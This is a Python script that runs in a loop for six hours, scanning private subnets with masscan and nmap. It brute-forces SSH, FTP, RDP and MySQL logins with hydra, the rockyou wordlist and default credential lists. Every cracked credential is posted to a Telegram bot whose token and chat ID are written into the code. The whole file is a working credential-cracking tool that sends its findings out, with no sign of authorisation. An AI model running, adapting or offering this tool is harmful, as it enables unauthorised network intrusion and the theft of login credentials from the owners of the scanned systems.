#!/usr/bin/env python3
# brody_6h.py - 6-hour infinite loop with 10-min heartbeat

import subprocess, threading, time, json, os, sys, re, socket
from datetime import datetime
import logging
import requests
from concurrent.futures import ThreadPoolExecutor
import paramiko
import pymysql

# ---------- Telegram ----------
TOKEN = os.environ.get("TELEGRAM_TOKEN", "8608061868:AAHEEsZPOw8vq100WyyusF3QjTlBvTq9-Iw")
ADMIN = os.environ.get("ADMIN_CHAT_ID", "7963634461")

# ---------- Config ----------
TARGETS = ["192.168.1.0/24", "10.0.0.0/24"]
PORTS = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5900, 8080, 8443]
WORDLIST = "/usr/share/wordlists/rockyou.txt"
OUTPUT = "/tmp/brody_6h"
os.makedirs(OUTPUT, exist_ok=True)
os.makedirs("/usr/share/wordlists", exist_ok=True)

if not os.path.exists(WORDLIST):
    subprocess.run(f"wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O {WORDLIST}", shell=True)

# ---------- Logging ----------
logging.basicConfig(level=logging.INFO, format='[Brody] %(asctime)s - %(message)s')
log = logging.getLogger("Brody6H")

# ---------- Reporter ----------
class Reporter:
    def __init__(self):
        self.base = f"https://api.telegram.org/bot{TOKEN}"
        self.chat = ADMIN
        self.last_hb = 0

    def send(self, text):
        try:
            requests.post(f"{self.base}/sendMessage", json={"chat_id": self.chat, "text": text, "parse_mode": "Markdown"}, timeout=3)
        except: pass

    def heartbeat(self, cycle, found):
        now = time.time()
        if now - self.last_hb < 600: return
        self.last_hb = now
        msg = f"❤️‍🔥 *Brody 6H Cycle {cycle}*\n⏱ {datetime.now().strftime('%H:%M:%S')}\n🔹 Found: {found}\n🔹 Next scan in 10 min"
        self.send(msg)

    def crack_report(self, ip, port, service, creds):
        msg = f"🔓 *CRACKED!*\nIP: `{ip}`\nPort: `{port}`\nService: `{service}`\nCreds: `{creds}`"
        self.send(msg)

reporter = Reporter()

# ---------- Scan Engine ----------
def run_scan():
    results = []
    log.info("Scanning targets...")
    port_str = ",".join(map(str, PORTS))
    subprocess.run(f"masscan {TARGETS[0]} -p{port_str} --rate=1000 -oJ {OUTPUT}/masscan.json", shell=True, timeout=120)
    try:
        with open(f"{OUTPUT}/masscan.json") as f:
            data = json.load(f)
        for entry in data:
            ip = entry.get('ip')
            for p in entry.get('ports', []):
                port = p.get('port')
                subprocess.run(f"nmap -sV -p{port} {ip} -oG {OUTPUT}/nmap_{ip}_{port}.txt", shell=True, timeout=20)
                banner = "unknown"
                try:
                    with open(f"{OUTPUT}/nmap_{ip}_{port}.txt") as nf:
                        txt = nf.read()
                    m = re.search(r'(\d+)/tcp\s+open\s+(\S+)\s+(.+)', txt)
                    if m: banner = f"{m.group(2)} {m.group(3)}"
                except: pass
                results.append({'ip': ip, 'port': port, 'banner': banner})
    except Exception as e:
        log.error(f"Scan error: {e}")
    return results

# ---------- Hydra Brute ----------
def run_hydra(hosts):
    svc_port = {22:'ssh', 21:'ftp', 3389:'rdp', 3306:'mysql'}
    for item in hosts:
        ip = item['ip']; port = item['port']
        if port not in svc_port: continue
        service = svc_port[port]
        cmd = f"hydra -C {WORDLIST} -t 4 -o {OUTPUT}/hydra_{ip}_{port}.txt {ip} {service} -s {port} -f"
        try:
            subprocess.run(cmd, shell=True, timeout=90)
            with open(f"{OUTPUT}/hydra_{ip}_{port}.txt") as f:
                for line in f:
                    if '[SUCCESS]' in line:
                        cred = line.split('[SUCCESS]')[-1].strip()
                        reporter.crack_report(ip, port, service, cred)
        except: pass

# ---------- SSH Pure Python ----------
def run_ssh_brute(hosts):
    ips = list(set([h['ip'] for h in hosts if h['port'] == 22]))
    users = ['root','admin','ubuntu','pi','user']
    passes = ['root','admin','password','123456','toor']
    for ip in ips:
        for u in users:
            for p in passes:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=u, password=p, timeout=2)
                    ssh.close()
                    cred = f"{u}:{p}"
                    reporter.crack_report(ip, 22, 'ssh', cred)
                    break
                except: pass

# ---------- MySQL Pure Python ----------
def run_mysql_brute(hosts):
    ips = list(set([h['ip'] for h in hosts if h['port'] == 3306]))
    creds = [('root',''), ('root','root'), ('mysql','mysql'), ('admin','admin')]
    for ip in ips:
        for u,p in creds:
            try:
                conn = pymysql.connect(host=ip, user=u, password=p, timeout=2)
                conn.close()
                reporter.crack_report(ip, 3306, 'mysql', f"{u}:{p}")
                break
            except: pass

# ---------- Main Loop ----------
def main():
    start = time.time()
    duration = 6 * 3600   # ۶ ساعت
    cycle = 0
    total_found = 0

    log.info("🚀 Brody 6H Engine started")
    reporter.send("🔥 Brody 6-Hour Crack Engine initialized")

    while time.time() - start < duration:
        cycle += 1
        log.info(f"Cycle {cycle} started")
        reporter.heartbeat(cycle, total_found)

        # ۱. اسکن
        hosts = run_scan()

        # ۲. کرک با هیدرا
        run_hydra(hosts)

        # ۳. کرک SSH خالص
        run_ssh_brute(hosts)

        # ۴. کرک MySQL خالص
        run_mysql_brute(hosts)

        # ۵. جمع‌آوری نتایج
        # (خود توابع گزارش می‌دن)

        # ۶. sleep تا ۱۰ دقیقه بعد
        elapsed = time.time() - start
        if elapsed < duration:
            sleep_time = min(600, duration - elapsed)
            log.info(f"Sleeping {sleep_time}s until next cycle")
            time.sleep(sleep_time)

    # گزارش نهایی
    reporter.send("✅ *6-Hour Session Complete*\n🔹 Total cycles: " + str(cycle))
    log.info("Session finished")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        reporter.send("🛑 Stopped by user")
        sys.exit(0)
    except Exception as e:
        reporter.send(f"💀 Fatal: {e}")
        log.critical(f"Fatal: {e}")
        sys.exit(1)
